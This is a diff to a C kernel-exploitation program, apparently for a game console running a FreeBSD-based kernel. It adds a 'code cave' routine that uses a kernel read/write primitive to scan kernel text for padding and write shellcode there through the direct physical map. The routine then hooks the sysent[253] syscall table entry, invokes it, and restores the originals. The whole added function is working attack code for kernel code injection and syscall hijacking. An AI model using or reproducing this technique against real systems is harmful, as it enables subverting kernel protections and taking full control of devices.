@@ -676,6 +676,219 @@ static int load_kmod_kstuff(void *result_vaddr, uint64_t result_kva) {
     return -1;
 }
 
+/* ─── Code cave approach: write shellcode to ktext padding ─── */
+
+static int load_kmod_codecave(void *result_vaddr, uint64_t result_kva) {
+    printf("\n[*] Trying code cave approach (write to ktext padding)...\n");
+
+    if (!g_sysent_kva) {
+        printf("[-] sysent not discovered\n");
+        return -1;
+    }
+
+    /* Scan ktext for a code cave: a run of 0xCC (INT3) or 0x00 bytes
+     * large enough for our flat binary (~352 bytes). Need 512+ bytes
+     * to be safe. Scan via DMAP reads. */
+    size_t cave_needed = (size_t)KMOD_FLAT_SZ + 64; /* payload + safety margin */
+    uint64_t cave_kva = 0;
+    uint64_t ktext_end = g_kdata_base; /* ktext ends where kdata begins */
+    uint64_t scan_start = g_ktext_base;
+
+    printf("[*] Scanning ktext (0x%lx - 0x%lx) for %zu-byte code cave...\n",
+           (unsigned long)scan_start, (unsigned long)ktext_end, cave_needed);
+
+    /* Scan in 4KB pages */
+    uint64_t best_run_start = 0;
+    size_t best_run_len = 0;
+    size_t current_run = 0;
+    uint64_t current_run_start = 0;
+    uint64_t pages_scanned = 0;
+
+    for (uint64_t va = scan_start; va < ktext_end && !cave_kva; va += 0x1000) {
+        uint64_t pa = va_to_pa(va);
+        if (!pa || pa >= MAX_SAFE_PA) {
+            current_run = 0;
+            continue;
+        }
+
+        uint8_t page[4096];
+        if (kernel_copyout(g_dmap_base + pa, page, 4096) != 0) {
+            current_run = 0;
+            continue;
+        }
+        pages_scanned++;
+
+        for (int i = 0; i < 4096; i++) {
+            if (page[i] == 0xCC || page[i] == 0x00) {
+                if (current_run == 0)
+                    current_run_start = va + i;
+                current_run++;
+                if (current_run >= cave_needed && current_run > best_run_len) {
+                    best_run_start = current_run_start;
+                    best_run_len = current_run;
+                    cave_kva = best_run_start;
+                }
+            } else {
+                current_run = 0;
+            }
+        }
+    }
+
+    printf("    Scanned %lu pages\n", (unsigned long)pages_scanned);
+
+    if (!cave_kva) {
+        printf("[-] No suitable code cave found (best run: %zu bytes at 0x%lx)\n",
+               best_run_len, (unsigned long)best_run_start);
+        return -1;
+    }
+
+    /* Align cave to 16 bytes */
+    cave_kva = (cave_kva + 15) & ~15ULL;
+    printf("[+] Code cave at 0x%lx (ktext+0x%lx), %zu bytes available\n",
+           (unsigned long)cave_kva,
+           (unsigned long)(cave_kva - g_ktext_base),
+           best_run_len);
+
+    /* Get physical address of cave via page table walk */
+    uint64_t cave_pa = va_to_pa(cave_kva);
+    if (!cave_pa) {
+        printf("[-] Cave VA->PA failed\n");
+        return -1;
+    }
+    uint64_t cave_dmap = g_dmap_base + cave_pa;
+
+    /* Save original bytes */
+    size_t save_len = (size_t)KMOD_FLAT_SZ;
+    uint8_t *saved_bytes = malloc(save_len);
+    if (!saved_bytes) {
+        printf("[-] malloc failed\n");
+        return -1;
+    }
+    kernel_copyout(cave_dmap, saved_bytes, save_len);
+
+    /* Write flat binary shellcode to ktext via DMAP */
+    kernel_copyin((void *)KMOD_FLAT, cave_dmap, (size_t)KMOD_FLAT_SZ);
+    printf("[+] Wrote %lu bytes of shellcode to ktext cave via DMAP\n",
+           (unsigned long)KMOD_FLAT_SZ);
+
+    /* Verify write */
+    uint8_t verify[16];
+    kernel_copyout(cave_dmap, verify, 16);
+    if (memcmp(verify, KMOD_FLAT, 16) != 0) {
+        printf("[-] Shellcode write verification failed!\n");
+        printf("    Expected: ");
+        for (int i = 0; i < 16; i++) printf("%02x ", KMOD_FLAT[i]);
+        printf("\n    Got:      ");
+        for (int i = 0; i < 16; i++) printf("%02x ", verify[i]);
+        printf("\n");
+        free(saved_bytes);
+        return -1;
+    }
+    printf("[+] Write verified OK\n");
+
+    /* Set up args in the result buffer area (we have 0x4000 bytes).
+     * Put args at offset 0x1000 in the result buffer allocation. */
+    struct kmod_flat_args *args_ptr = (struct kmod_flat_args *)
+        ((uint8_t *)result_vaddr + 0x1000);
+    args_ptr->output_kva = result_kva;
+    args_ptr->kdata_base = g_kdata_base;
+    args_ptr->fw_ver = (uint32_t)(g_fw_version >> 16);
+    args_ptr->pad = 0;
+
+    /* Get DMAP address of args */
+    uint64_t args_cpu_pa = va_to_cpu_pa((uint64_t)args_ptr);
+    uint64_t args_kva = g_dmap_base + args_cpu_pa;
+    printf("[+] Args at DMAP 0x%lx\n", (unsigned long)args_kva);
+
+    /* Hook sysent[253] to point to our code cave */
+    #define CAVE_INVOKE_SYSCALL 253
+    uint64_t ent_kva = g_sysent_kva +
+                       (uint64_t)CAVE_INVOKE_SYSCALL * SYSENT_STRIDE;
+    uint64_t ent_pa = va_to_pa(ent_kva);
+    if (!ent_pa) {
+        printf("[-] sysent[%d] VA->PA failed\n", CAVE_INVOKE_SYSCALL);
+        kernel_copyin(saved_bytes, cave_dmap, save_len);
+        free(saved_bytes);
+        return -1;
+    }
+
+    /* Save original sysent entry */
+    uint8_t orig_sysent[SYSENT_STRIDE];
+    kernel_copyout(g_dmap_base + ent_pa, orig_sysent, SYSENT_STRIDE);
+
+    /* Write cave_kva to sy_call (offset +8) */
+    uint64_t call_pa = va_to_pa(ent_kva + 8);
+    if (!call_pa) {
+        printf("[-] sysent sy_call VA->PA failed\n");
+        kernel_copyin(saved_bytes, cave_dmap, save_len);
+        free(saved_bytes);
+        return -1;
+    }
+    kernel_copyin(&cave_kva, g_dmap_base + call_pa, 8);
+
+    /* Set narg=1 (one pointer argument) at offset +0 */
+    int32_t narg_one = 1;
+    kernel_copyin(&narg_one, g_dmap_base + ent_pa, 4);
+
+    printf("[+] sysent[%d] hooked -> cave 0x%lx\n",
+           CAVE_INVOKE_SYSCALL, (unsigned long)cave_kva);
+
+    /* The flat binary's module_start expects (kmod_args *args).
+     * When called via sysent, the kernel calls sy_call(td, uap).
+     * The first arg (td) will be passed instead of args.
+     *
+     * We need a different approach: write a tiny stub that loads
+     * the args pointer and calls module_start. Since we're already
+     * in the code cave, prepend a stub:
+     *   movabs $args_kva, %rdi
+     *   jmp module_start  (which is right after the stub)
+     */
+
+    /* Rebuild: write stub + payload */
+    uint8_t stub[16];
+    int sp = 0;
+    /* movabs $args_kva, %rdi */
+    stub[sp++] = 0x48; stub[sp++] = 0xBF;
+    memcpy(&stub[sp], &args_kva, 8); sp += 8;
+    /* jmp +0 (skip to payload, offset = 0 since payload follows immediately) */
+    /* Actually payload starts right after stub, so just fall through.
+     * But module_start expects to be at offset 0, so we need to:
+     * movabs $args, %rdi; then fall into module_start code.
+     * However module_start's prologue saves regs and uses rdi as first arg.
+     * We just need rdi = args_kva when module_start starts. */
+
+    /* Write stub first, then payload right after */
+    kernel_copyin(stub, cave_dmap, sp);
+    kernel_copyin((void *)KMOD_FLAT, cave_dmap + sp, (size_t)KMOD_FLAT_SZ);
+
+    /* Update sysent to point to cave_kva (stub start) - already done */
+    printf("[+] Stub (%d bytes) + payload (%lu bytes) written\n",
+           sp, (unsigned long)KMOD_FLAT_SZ);
+
+    /* Fire! */
+    printf("[*] Calling syscall(%d)...\n", CAVE_INVOKE_SYSCALL);
+    fflush(stdout);
+
+    long sc_ret = syscall(CAVE_INVOKE_SYSCALL);
+    printf("[+] syscall returned %ld (errno=%d)\n", sc_ret, errno);
+
+    /* Restore sysent + cave immediately */
+    kernel_copyin(orig_sysent, g_dmap_base + ent_pa, SYSENT_STRIDE);
+    kernel_copyin(saved_bytes, cave_dmap, save_len + sp);
+    free(saved_bytes);
+    printf("[+] sysent[%d] and code cave restored\n", CAVE_INVOKE_SYSCALL);
+
+    /* Check results */
+    struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;
+    if (results->magic == KMOD_MAGIC && results->status == KMOD_STATUS_DONE) {
+        return 0;
+    }
+
+    printf("[!] Kmod did not complete (magic=0x%lx status=%u)\n",
+           (unsigned long)results->magic, results->status);
+    return -1;
+}
+
 static void load_kmod(void) {
     printf("\n=============================================\n");
     printf("  Loading Kernel Module\n");
@@ -1738,7 +1951,12 @@ int main(void) {
             }
 
             if (kmod_ok != 0) {
-                printf("\n[*] kstuff approach failed — falling back to kldload\n");
+                /* Try code cave approach (write to ktext padding) */
+                kmod_ok = load_kmod_codecave(kmod_vaddr, kmod_result_kva);
+            }
+
+            if (kmod_ok != 0) {
+                printf("\n[*] All approaches failed — falling back to kldload\n");
                 load_kmod();
             } else {
                 /* Print kstuff results */
